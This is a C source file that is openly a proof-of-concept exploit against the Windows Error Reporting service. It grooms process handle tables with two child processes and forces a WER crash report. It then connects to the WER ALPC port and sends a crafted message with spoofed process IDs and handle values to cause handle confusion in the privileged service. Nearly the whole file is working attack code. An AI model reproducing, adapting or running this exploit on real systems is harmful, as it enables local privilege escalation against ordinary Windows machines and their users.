#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ---- NT types ----
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

typedef LONG NTSTATUS, *PNTSTATUS;

typedef struct _UNICODE_STRING_T {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_T;

typedef struct _OBJECT_ATTRIBUTES_T {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING_T ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_T;

#define OBJ_CASE_INSENSITIVE 0x00000040

#pragma pack(push, 8)
typedef struct _PORT_MESSAGE_T {
    union {
        struct {
            USHORT DataLength;
            USHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            USHORT Type;
            USHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union {
        SIZE_T ClientViewSize;
        ULONG CallbackId;
    };
} PORT_MESSAGE_T;

typedef struct _ALPC_PORT_ATTRIBUTES_T {
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    SIZE_T DupObjectCount;
    SIZE_T Reserved;
} ALPC_PORT_ATTRIBUTES_T;
#pragma pack(pop)

// ---- WER message structures ----
#define WER_MSG_TOTAL_SIZE  0x578
#define WER_MSG_BODY_SIZE   (WER_MSG_TOTAL_SIZE - 0x28)

#pragma pack(push, 8)
typedef struct _WER_ALPC_MSG {
    PORT_MESSAGE_T Header;
    DWORD   Method;
    DWORD   Flags;
    DWORD   PidPrimary;
    DWORD   Pad1;
    DWORD   Tid;
    BYTE    Pad2[0x24];
    DWORD   PidSecondary;
    DWORD   HandleValue;
    ULONGLONG HandleArray[5];
    DWORD   StatusOut;
    DWORD   ResultOut;
    BYTE    SharedData[0x4B8];
} WER_ALPC_MSG, *PWER_ALPC_MSG;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _WER_SHARED_HDR {
    DWORD Size;
    DWORD TargetPid;
    DWORD Flags;
    BYTE   Data[0xEC];
} WER_SHARED_HDR, *PWER_SHARED_HDR;
#pragma pack(pop)

// IPC structure
#define IPC_SECTION_NAME L"Global\\WER_Exploit_IPC"
#define IPC_SECTION_SIZE 0x1000

#pragma pack(push, 1)
typedef struct _EXPLOIT_IPC {
    DWORD   Magic;
    DWORD   PidA;
    DWORD   PidB;
    DWORD   HandleValueA;
    DWORD   HandleValueB;
    DWORD   ReadyA;
    DWORD   ReadyB;
    BYTE    Padding[0x1000 - 0x1C];
} EXPLOIT_IPC, *PEXPLOIT_IPC;
#pragma pack(pop)

// ---- Function pointers ----
// CORRECT NtAlpcConnectPort signature — 6th param is RequiredServerSid (PSID)
typedef NTSTATUS (NTAPI *pfnNtAlpcConnectPort)(
    PHANDLE PortHandle,
    UNICODE_STRING_T* PortName,
    OBJECT_ATTRIBUTES_T* ObjectAttributes,
    ALPC_PORT_ATTRIBUTES_T* PortAttributes,
    ULONG Flags,
    PSID RequiredServerSid,
    PORT_MESSAGE_T* ConnectionMessage,
    PSIZE_T ConnectionMessageLength,
    PVOID OutMessageAttributes,
    PVOID InMessageAttributes,
    PLARGE_INTEGER Timeout);

typedef NTSTATUS (NTAPI *pfnNtAlpcSendWaitReceivePort)(
    HANDLE PortHandle,
    ULONG Flags,
    PORT_MESSAGE_T* SendMsg,
    PVOID SendMsgOptions,
    PORT_MESSAGE_T* RecvMsg,
    PULONG RecvMsgLength,
    PVOID Timeout,
    PVOID PortAttrs);

typedef void (NTAPI *pfnRtlInitUnicodeString)(
    UNICODE_STRING_T* DestinationString,
    PCWSTR SourceString);

static pfnNtAlpcConnectPort       NtAlpcConnectPort;
static pfnNtAlpcSendWaitReceivePort NtAlpcSendWaitReceivePort;
static pfnRtlInitUnicodeString    RtlInitUnicodeString;

// ---- IPC helpers ----
static PEXPLOIT_IPC MapIPCSection(void) {
    HANDLE hMap = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, IPC_SECTION_NAME);
    if (!hMap) return NULL;
    PEXPLOIT_IPC ipc = (PEXPLOIT_IPC)MapViewOfFile(
        hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    CloseHandle(hMap);
    return ipc;
}

static void UnmapIPCSection(PEXPLOIT_IPC ipc) {
    if (ipc) UnmapViewOfFile(ipc);
}

// ---- Process A ----
int procA_entry(DWORD pidB) {
    PEXPLOIT_IPC ipc = MapIPCSection();
    if (!ipc) {
        printf("[A] Failed to map IPC section\n");
        return 1;
    }

    HANDLE hMap = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                     PAGE_READWRITE, 0, 0xF8, NULL);
    if (!hMap) {
        printf("[A] CreateFileMapping failed: %d\n", GetLastError());
        UnmapIPCSection(ipc);
        return 1;
    }

    DWORD handleValue = (DWORD)(ULONG_PTR)hMap;
    printf("[A] File mapping handle: 0x%x\n", handleValue);

    PWER_SHARED_HDR view = (PWER_SHARED_HDR)MapViewOfFile(
        hMap, FILE_MAP_WRITE, 0, 0, 0);
    if (!view) {
        CloseHandle(hMap);
        UnmapIPCSection(ipc);
        return 2;
    }

    memset(view, 0, 0xF8);
    view->Size = 0xF8;
    view->TargetPid = pidB;
    UnmapViewOfFile(view);

    ipc->HandleValueA = handleValue;
    ipc->ReadyA = 1;
    printf("[A] Ready. Handle 0x%x written to IPC\n", handleValue);

    UnmapIPCSection(ipc);
    Sleep(INFINITE);
    CloseHandle(hMap);
    return 0;
}

// ---- Process B ----
int procB_entry(DWORD pidA) {
    PEXPLOIT_IPC ipc = MapIPCSection();
    if (!ipc) {
        printf("[B] Failed to map IPC section\n");
        return 1;
    }

    for (int i = 0; i < 50 && !ipc->ReadyA; i++) {
        Sleep(100);
    }

    if (!ipc->ReadyA) {
        printf("[B] Process A never signaled ready\n");
        UnmapIPCSection(ipc);
        return 1;
    }

    DWORD target_handle = ipc->HandleValueA;
    printf("[B] Target handle index: 0x%x\n", target_handle);

    HANDLE events[4096];
    int count = 0;

    while (count < 4096) {
        HANDLE h = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!h) break;
        DWORD hv = (DWORD)(ULONG_PTR)h;
        events[count++] = h;

        if (hv >= target_handle) {
            if (hv == target_handle) {
                CloseHandle(h);
                count--;
                printf("[B] Freed slot at exact target 0x%x\n", hv);
                break;
            }
            CloseHandle(h);
            count--;
            printf("[B] Overshot to 0x%x, backing off\n", hv);
            break;
        }
    }

    HANDLE hPayload = CreateFileMappingW(
        INVALID_HANDLE_VALUE, NULL,
        PAGE_READWRITE, 0, 0xF8, NULL);

    DWORD payload_handle = (DWORD)(ULONG_PTR)hPayload;
    printf("[B] Payload handle: 0x%x (target: 0x%x)\n",
           payload_handle, target_handle);

    if (payload_handle != target_handle) {
        printf("[B] Handle mismatch! Need more grooming.\n");
        printf("[B] Current events allocated: %d\n", count);
    }

    PWER_SHARED_HDR payload = (PWER_SHARED_HDR)MapViewOfFile(
        hPayload, FILE_MAP_WRITE, 0, 0, 0);
    if (payload) {
        memset(payload, 0, 0xF8);
        payload->Size = 0xF8;
        payload->TargetPid = GetCurrentProcessId();
        UnmapViewOfFile(payload);
    }

    ipc->HandleValueB = payload_handle;
    ipc->ReadyB = 1;
    printf("[B] Ready. Payload handle 0x%x written to IPC\n", payload_handle);

    UnmapIPCSection(ipc);
    Sleep(INFINITE);
    CloseHandle(hPayload);

    for (int i = 0; i < count; i++) {
        if (events[i]) CloseHandle(events[i]);
    }
    return 0;
}

// ---- Trigger WER report ----
static void TriggerWerReport(void) {
    printf("[*] Triggering WER report to force ALPC port creation...\n");

    // Method 1: sacrificial crash process
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    WCHAR cmd[] = L"rundll32.exe sysdm.cpl,NoEntry";
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[*] Launched sacrificial process PID %d\n", pi.dwProcessId);
        Sleep(3000);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    // Method 2: WerReportCreate + WerReportSubmit
    HMODULE wer = LoadLibraryA("wer.dll");
    if (wer) {
        typedef HRESULT(WINAPI *pfnWerReportCreate)(PCWSTR, int, PVOID, PVOID*);
        typedef HRESULT(WINAPI *pfnWerReportSubmit)(PVOID, int, DWORD, PVOID*);
        pfnWerReportCreate pCreate = (pfnWerReportCreate)GetProcAddress(wer, "WerReportCreate");
        pfnWerReportSubmit pSubmit = (pfnWerReportSubmit)GetProcAddress(wer, "WerReportSubmit");
        if (pCreate && pSubmit) {
            PVOID hReport = NULL;
            HRESULT hr = pCreate(L"Test", 2, NULL, &hReport);
            if (SUCCEEDED(hr) && hReport) {
                printf("[*] WerReportCreate succeeded, submitting...\n");
                pSubmit(hReport, 1, 0, NULL);
            }
        }
    }
}

// ---- Main ----
int main(int argc, char *argv[]) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    NtAlpcConnectPort = (pfnNtAlpcConnectPort)
        GetProcAddress(ntdll, "NtAlpcConnectPort");
    NtAlpcSendWaitReceivePort = (pfnNtAlpcSendWaitReceivePort)
        GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");
    RtlInitUnicodeString = (pfnRtlInitUnicodeString)
        GetProcAddress(ntdll, "RtlInitUnicodeString");

    if (!NtAlpcConnectPort || !NtAlpcSendWaitReceivePort || !RtlInitUnicodeString) {
        printf("[-] Failed to resolve NtAlpc functions\n");
        return 1;
    }

    if (argc > 2) {
        DWORD pidA = (DWORD)atoi(argv[2]);
        DWORD pidB = (DWORD)atoi(argv[3]);
        if (!strcmp(argv[1], "--procA")) return procA_entry(pidB);
        if (!strcmp(argv[1], "--procB")) return procB_entry(pidA);
    }

    printf("=== WER ALPC Handle Confusion Exploit ===\n\n");

    HANDLE hIPC = CreateFileMappingW(
        INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
        0, IPC_SECTION_SIZE, IPC_SECTION_NAME);
    if (!hIPC) {
        printf("[-] Failed to create IPC section: %d\n", GetLastError());
        return 1;
    }
    PEXPLOIT_IPC ipc = (PEXPLOIT_IPC)MapViewOfFile(
        hIPC, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!ipc) {
        CloseHandle(hIPC);
        return 1;
    }
    memset(ipc, 0, IPC_SECTION_SIZE);
    ipc->Magic = 0x57455258;

    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    WCHAR cmdA[MAX_PATH + 64];
    wsprintfW(cmdA, L"\"%s\" --procA 0 0", selfPath);
    if (!CreateProcessW(NULL, cmdA, NULL, NULL, FALSE,
                        0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to spawn A: %d\n", GetLastError());
        return 1;
    }
    HANDLE g_procA = pi.hProcess;
    DWORD g_pidA = pi.dwProcessId;
    ipc->PidA = g_pidA;
    printf("[+] Process A: PID %d\n", g_pidA);

    WCHAR cmdB[MAX_PATH + 64];
    wsprintfW(cmdB, L"\"%s\" --procB %d 0", selfPath, g_pidA);
    if (!CreateProcessW(NULL, cmdB, NULL, NULL, FALSE,
                        0, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to spawn B: %d\n", GetLastError());
        return 1;
    }
    HANDLE g_procB = pi.hProcess;
    DWORD g_pidB = pi.dwProcessId;
    ipc->PidB = g_pidB;
    printf("[+] Process B: PID %d\n", g_pidB);

    printf("[*] Waiting for child processes to initialize...\n");
    for (int i = 0; i < 50; i++) {
        if (ipc->ReadyA && ipc->ReadyB) break;
        Sleep(100);
    }

    DWORD handleValueA = ipc->HandleValueA;
    DWORD handleValueB = ipc->HandleValueB;
    printf("[+] Handle A: 0x%x  Handle B: 0x%x\n", handleValueA, handleValueB);
    printf("[+] PidPrimary=%d PidSecondary=%d\n", g_pidA, g_pidB);

    TriggerWerReport();
    Sleep(2000);

    // ---- Connect to WER ALPC port ----
    // Using the EXACT parameters that worked in the test:
    // mode=0, NULL ObjectAttributes, NULL PortAttributes, NULL RequiredServerSid
    UNICODE_STRING_T portName;
    RtlInitUnicodeString(&portName, L"\\WindowsErrorReportingServicePort");

    __declspec(align(8)) BYTE connBuf[0x200];
    ZeroMemory(connBuf, sizeof(connBuf));

    PORT_MESSAGE_T* connMsg = (PORT_MESSAGE_T*)connBuf;
    connMsg->u1.s1.TotalLength = 0x28;
    connMsg->u1.s1.DataLength = 0;
    connMsg->u2.ZeroInit = 0;

    SIZE_T connLen = 0x28;

    HANDLE hPort = NULL;
    NTSTATUS status = NtAlpcConnectPort(
        &hPort,
        &portName,
        NULL,       // ObjectAttributes — NULL works
        NULL,       // PortAttributes — NULL works
        0,          // Flags
        NULL,       // RequiredServerSid — NULL = no SID restriction
        connMsg,    // ConnectionMessage
        &connLen,   // BufferLength
        NULL,       // OutMessageAttributes
        NULL,       // InMessageAttributes
        NULL);      // Timeout

    printf("[*] NtAlpcConnectPort: 0x%08X (connLen=%llu)\n",
           (unsigned int)status, (unsigned long long)connLen);

    if (status < 0) {
        printf("[-] Connection failed: 0x%08x\n", (unsigned int)status);
        goto cleanup;
    }
    printf("[+] Connected to WER ALPC port: 0x%p\n", hPort);

    // ---- Build malicious message ----
    WER_ALPC_MSG msg;
    memset(&msg, 0, sizeof(msg));

    msg.Header.u1.s1.TotalLength = WER_MSG_TOTAL_SIZE;
    msg.Header.u1.s1.DataLength = WER_MSG_BODY_SIZE;
    msg.Header.u2.ZeroInit = 0;

    msg.Method = 0x20000000;
    msg.PidPrimary = g_pidA;
    msg.PidSecondary = g_pidB;
    msg.HandleValue = handleValueA;
    msg.HandleArray[0] = handleValueA;

    printf("[*] Sending ALPC message...\n");
    printf("    Method: 0x%08x\n", msg.Method);
    printf("    PidPrimary: %d\n", msg.PidPrimary);
    printf("    PidSecondary: %d\n", msg.PidSecondary);
    printf("    HandleValue: 0x%x\n", msg.HandleValue);

    WER_ALPC_MSG reply;
    memset(&reply, 0, sizeof(reply));
    ULONG replyLen = sizeof(reply);

    status = NtAlpcSendWaitReceivePort(
        hPort,
        0,
        (PORT_MESSAGE_T*)&msg,
        NULL,
        (PORT_MESSAGE_T*)&reply,
        &replyLen,
        NULL,
        NULL);

    if (status < 0) {
        printf("[-] Send failed: 0x%08x\n", (unsigned int)status);
    } else {
        printf("[+] Reply received!\n");
        printf("    StatusOut: 0x%08x\n", reply.StatusOut);
        printf("    ResultOut: 0x%08x\n", reply.ResultOut);
    }

    CloseHandle(hPort);

cleanup:
    UnmapViewOfFile(ipc);
    CloseHandle(hIPC);

    printf("\n[*] Children running. Press Enter to cleanup.\n");
    getchar();

    TerminateProcess(g_procA, 0);
    TerminateProcess(g_procB, 0);
    CloseHandle(g_procA);
    CloseHandle(g_procB);

    return 0;
}